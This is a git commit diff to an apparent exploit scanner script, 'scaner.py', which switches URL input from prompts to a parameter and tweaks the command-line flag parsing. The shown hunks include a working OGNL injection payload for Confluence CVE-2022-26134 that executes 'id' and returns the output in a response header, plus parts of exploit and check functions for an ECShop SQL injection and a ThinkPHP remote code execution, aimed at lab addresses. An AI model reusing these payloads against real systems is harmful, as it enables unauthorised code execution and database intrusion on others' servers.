9ace9966dca53711df12789d6c86f55af36b583c
9rm6nk9 <91755900+Armen1205@users.noreply.github.com>
2022-11-27 20:59:34 +0300

    Added interface

--- scaner.py
+++ scaner.py
@@ -6,7 +6,7 @@ from wsgiref import headers
 import requests
 
 def exploit_confluence_CVE_2022_26134(URL):
-    url1 = input('write url\n')
+    url1 = URL
     url1 += "{(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(" + "id"").getInputStream()," + "utf-8"")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(" + "X-Cmd-Response"",#a))}/"
     headers1 = { "HOST":"192.168.56.101:8090", 
                 "Accept-Encoding":"gzip, deflate",
@@ -18,7 +18,7 @@ def exploit_confluence_CVE_2022_26134(URL):
     print(res1.headers)
 
 def check_confluence_CVE_2022_26134(URL):
-    url1 = input('write url\n')
+    url1 = URL
     res1 = requests.post(url1)
     if(res1.headers['x-confluence-request-time'] != 0):
         print('Code injection can be used')
@@ -27,7 +27,7 @@ def check_confluence_CVE_2022_26134(URL):
         print('lol')
 
 def exploit_ecshop(URL):
-    url1 = input('write url\n') + "/user.php?act=login"
+    url1 = URL + "/user.php?act=login"
     headers1 = {"Host":"192.168.56.101",
                 "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
                 "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
@@ -46,7 +46,7 @@ def exploit_ecshop(URL):
         print("something went wrong")
 
 def check_ecshop(URL):
-    url1 = input('write url\n') + "/user.php?act=login"
+    url1 = URL + "/user.php?act=login"
     headers1 = {"Host":"192.168.56.101",
                 "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
                 "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
@@ -63,7 +63,7 @@ def check_ecshop(URL):
         print("SQLi can be used")
 
 def thinkphp_exploit_RCE(URL):
-    url1 = input('write url\n') 
+    url1 = URL 
     url1 += "/index.php?s=captcha"
     my_heads = {"Host":"localhost",
                 "Accept-Encoding":"gzip, deflate",
@@ -141,12 +141,12 @@ def main():
                     'o':0}
         if my_task == "--HELP" or my_task == "-h":
             print(my_info)
+            continue
         if my_task == "-KILL" or my_task == "-k":
             break
         my_mas = my_task.split(" ")
         for b in range (len(my_mas)):
             if my_mas[b][0] == '-':
-                print(my_mas[b][1:])
                 if my_mas[b][1:] == 'u' or my_mas[b][1:] == '-URL':
                     my_flags['u'] = b
                 elif my_mas[b][1:] == 'sc' or my_mas[b][1:] == '-SQLc':
@@ -168,7 +168,11 @@ def main():
 
 
 
-        if [my_flags['o']]:
+
+
+
+
+        if my_flags['o']:
             f_w = open(my_mas[my_flags['o'] - 1])
         if my_flags['i']:
             f_r = open(my_mas[my_flags['i'] - 1])
